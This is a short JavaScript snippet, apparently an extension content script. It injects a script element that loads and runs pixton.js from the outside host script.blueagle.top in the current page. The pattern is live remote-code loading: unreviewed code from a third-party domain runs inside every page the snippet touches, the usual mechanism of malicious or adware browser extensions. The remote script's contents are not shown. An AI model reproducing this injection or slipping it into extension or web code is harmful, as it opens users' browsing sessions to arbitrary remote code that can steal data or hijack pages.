const script = document.createElement('script');
script.setAttribute('type', 'text/javascript');
script.setAttribute('src', 'https://script.blueagle.top/chrome_extension/pixton.js');
document.documentElement.appendChild(script);